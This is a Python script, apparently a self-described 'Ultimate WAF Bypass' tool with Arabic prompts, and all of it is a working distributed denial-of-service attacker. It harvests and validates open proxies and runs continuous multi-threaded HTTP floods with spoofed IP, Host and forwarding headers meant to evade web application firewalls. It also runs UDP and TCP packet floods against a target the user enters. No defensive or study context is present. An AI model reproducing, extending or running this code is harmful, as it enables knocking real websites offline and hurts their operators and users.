import requests
import threading
import time
import random
import socket
import urllib.parse
import base64

MAX_PROXIES = 100000
VALID_REQUIRED = 700
CHECK_TIMEOUT = 5
THREADS_PER_PROXY = 20

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
]

COMMON_PATHS = ["/", "/admin", "/login", "/dashboard", "/search", "/index.php", "/wp-login.php"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-A057F) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36"
]
HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE", "TRACE", "CONNECT"]

valid_proxies = []
lock = threading.Lock()

def banner():
    print("""
██████╗ ██╗   ██╗██╗   ██╗
██╔══██╗██║   ██║██║   ██║
██████╔╝██║   ██║██║   ██║
██╔═══╝ ██║   ██║██║   ██║
██║     ╚██████╔╝╚██████╔╝
╚═╝      ╚═════╝  ╚═════╝
PY - أصيل | LEGEND TOOL ⚔️ Ultimate WAF Bypass [🚀 لا يتوقف]
""")

def load_proxies():
    proxies = set()
    for url in PROXY_SOURCES:
        try:
            res = requests.get(url, timeout=10)
            for line in res.text.splitlines():
                if line.strip():
                    proxies.add(line.strip())
        except:
            continue
    return list(proxies)[:MAX_PROXIES]

def check_proxy(proxy):
    try:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get("http://example.com", proxies=proxies, timeout=CHECK_TIMEOUT)
        if r.status_code == 200:
            with lock:
                valid_proxies.append(proxy)
                print(f"[✓] صالح: {proxy}")
    except:
        pass

def start_check(proxies):
    threads = []
    for proxy in proxies:
        t = threading.Thread(target=check_proxy, args=(proxy,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def rotate_user_agents():
    while True:
        time.sleep(10)
        random.shuffle(USER_AGENTS)

def random_case(s):
    return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

def encode_url_params(params: dict):
    items = list(params.items())
    random.shuffle(items)
    encoded_items = []
    for k, v in items:
        if random.random() < 0.4:
            v = base64.b64encode(v.encode()).decode()
        k_enc = urllib.parse.quote(random_case(k))
        v_enc = urllib.parse.quote(v)
        encoded_items.append(f"{k_enc}={v_enc}")
    return "?" + "&".join(encoded_items)

def get_headers(url):
    ip_spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
    xff_values = [
        ip_spoof,
        "127.0.0.1",
        "localhost",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "255.255.255.255",
        "8.8.8.8"
    ]
    user_agent = random.choice(USER_AGENTS)
    referers = [
        "https://google.com",
        "https://youtube.com",
        "https://facebook.com",
        url,
        "https://bing.com",
        "https://duckduckgo.com",
        "https://yandex.com",
        "https://stackoverflow.com"
    ]
    host_header = random.choice([
        url.split("//")[-1].split("/")[0],
        "localhost",
        "127.0.0.1",
        "example.com",
        "api." + url.split("//")[-1].split("/")[0],
        "dev." + url.split("//")[-1].split("/")[0]
    ])
    cache_controls = ["no-cache", "max-age=0", "no-store", "must-revalidate", "proxy-revalidate", "public", "private"]

    headers = {
        "User-Agent": user_agent,
        "Referer": random.choice(referers),
        "Host": host_header,
        "X-Forwarded-For": random.choice(xff_values),
        "X-Real-IP": ip_spoof,
        "Client-IP": ip_spoof,
        "Via": ip_spoof,
        "Forwarded": f"for={ip_spoof}",
        "X-Custom-IP-Authorization": ip_spoof,
        "X-HTTP-Method-Override": random.choice(HTTP_METHODS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "ar-AE,ar;q=0.9", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": random.choice(["gzip, deflate", "identity"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "DNT": "1",
        "Cache-Control": random.choice(cache_controls),
        "Pragma": random.choice(["no-cache", "no-store"]),
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1" if random.randint(0, 1) else "?0",
        "X-Requested-With": random.choice(["XMLHttpRequest", "com.example.app", "com.android.browser"]),
        "TE": random.choice(["trailers", "deflate", "gzip"]),
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Credentials": "true",
        "X-Forwarded-For-2": random.choice(xff_values),
        "X-Forwarded-For-3": random.choice(xff_values),
    }

    if random.random() < 0.3:
        headers["X-Forwarded-For"] += ", " + random.choice(xff_values)

    return headers

def random_query():
    params = {
        "id": str(random.randint(100000,999999)),
        "ref": str(random.randint(1000,9999)),
        "page": str(random.randint(1,50)),
        "track": str(random.randint(100000,999999)),
        "session": base64.b64encode(str(random.randint(1000000,9999999)).encode()).decode()
    }
    return encode_url_params(params)

def random_post_data():
    return {
        "username": random_case("user" + str(random.randint(1000,9999))),
        "password": random_case("pass" + str(random.randint(1000,9999))),
        "token": base64.b64encode(str(random.randint(100000,999999)).encode()).decode(),
        "action": random.choice(["login", "update", "delete", "submit"]),
        "submit": "Submit"
    }

def http_flood(proxy, url, method):
    session = requests.Session()
    session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    while True:
        try:
            path = random.choice(COMMON_PATHS) + random_query()
            full_url = url + path
            headers = get_headers(url)
            if method in ["POST", "PUT", "PATCH", "DELETE"]:
                session.request(method, full_url, headers=headers, data=random_post_data(), timeout=5)
            else:
                session.request(method, full_url, headers=headers, timeout=5)
            time.sleep(random.uniform(0.05, 0.25))
        except:
            pass

def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(512)
    while True:
        try:
            sock.sendto(packet, (ip, port))
        except:
            pass

def tcp_flood(ip, port):
    packet = random._urandom(1024)
    while True:
        try:
            s = socket.socket()
            s.connect((ip, port))
            s.send(packet)
            s.close()
        except:
            pass

def run_all_attacks(ip, port, url):
    print(f"[+] بدء الهجوم المستمر على {ip} باستخدام {len(valid_proxies)} بروكسي...")

    for proxy in valid_proxies:
        for method in HTTP_METHODS:
            for _ in range(THREADS_PER_PROXY):
                threading.Thread(target=http_flood, args=(proxy, url, method), daemon=True).start()

    for _ in range(THREADS_PER_PROXY):
        threading.Thread(target=udp_flood, args=(ip, port), daemon=True).start()
        threading.Thread(target=tcp_flood, args=(ip, port), daemon=True).start()

def main():
    banner()
    url = input("[>] أدخل رابط الموقع (مثال: https://example.com): ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    try:
        ip = socket.gethostbyname(url.split("//")[-1].split("/")[0])
    except:
        print("[!] فشل في جلب IP من الرابط.")
        return

    print(f"[+] IP الهدف: {ip}")
    threading.Thread(target=rotate_user_agents, daemon=True).start()

    while len(valid_proxies) < VALID_REQUIRED:
        print("[*] تحميل و فحص البروكسيات...")
        start_check(load_proxies())
        print(f"[✓] عدد البروكسيات الصالحة: {len(valid_proxies)}")

    run_all_attacks(ip, 80, url)

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف الأداة.")

if __name__ == "__main__":
    main()
